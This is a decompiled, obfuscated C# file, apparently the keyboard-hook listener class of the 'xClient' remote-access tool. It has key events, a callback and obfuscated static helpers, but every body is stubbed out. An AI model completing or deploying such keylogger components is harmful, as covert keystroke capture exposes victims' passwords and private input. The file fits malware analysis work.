using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using dg3ypDAonQcOidMs0w;

namespace xClient.Core.MouseKeyHook.Implementation;

internal abstract class KeyListener : BaseListener, GInterface0
{
	[CompilerGenerated]
	private KeyEventHandler KeyDown;

	[CompilerGenerated]
	private KeyPressEventHandler KeyPress;

	[CompilerGenerated]
	private KeyEventHandler KeyUp;

	internal static KeyListener rMTXZijaduPA9u5UovX;

	public event KeyEventHandler Event_0
	{
		[CompilerGenerated]
		add
		{
		}
		[CompilerGenerated]
		remove
		{
		}
	}

	public event KeyPressEventHandler Event_1
	{
		[CompilerGenerated]
		add
		{
		}
		[CompilerGenerated]
		remove
		{
		}
	}

	public event KeyEventHandler Event_2
	{
		[CompilerGenerated]
		add
		{
		}
		[CompilerGenerated]
		remove
		{
		}
	}

	protected KeyListener(Delegate1 subscribe)
	{
	}

	public void InvokeKeyDown(GEventArgs0 e)
	{
	}

	public void InvokeKeyPress(GEventArgs1 e)
	{
	}

	public void InvokeKeyUp(GEventArgs0 e)
	{
	}

	protected override bool Callback(Struct1 data)
	{
		return true;
	}

	protected abstract IEnumerable<GEventArgs1> GetPressEventArgs(Struct1 data);

	protected abstract GEventArgs0 GetDownUpEventArgs(Struct1 data);

	static KeyListener()
	{
		WP6RZJql8gZrNhVA9v.prXoP4RuYp();
		nN5XCdjFcGILofGNCv5();
	}

	internal static void sJyQ48je2Rf3KxVS34w()
	{
	}

	internal static void BGmn5kjXZF0vcTiotwW()
	{
	}

	internal static bool uBx4H3jMkg9AeqY97DJ()
	{
		return true;
	}

	internal static KeyListener FTURdJjqUP0Tq9PpWFr()
	{
		return null;
	}

	internal static object MjmVm4jgqAy5leHTBAi(object object_0, object object_1)
	{
		return null;
	}

	internal static object xb85IYj7OPXh7XXWmBy(object object_0, object object_1)
	{
		return null;
	}

	internal static bool lRvqdUjSfh9ehDQABAF(object object_0)
	{
		return true;
	}

	internal static bool XOXt8Jj3xFncE0lQxCE(object object_0)
	{
		return true;
	}

	internal static void d8lqomjv8H4Ltu9MwZW(object object_0, object object_1, object object_2)
	{
	}

	internal static object E9GKsAjyxNPcGbpqyAe(object object_0, Struct1 data)
	{
		return null;
	}

	internal static bool hJXSyfjPq4NFAeIty5J(object object_0)
	{
		return true;
	}

	internal static void xovoW2jVCRZlImVNwC9(object object_0)
	{
	}

	internal static void nN5XCdjFcGILofGNCv5()
	{
	}
}
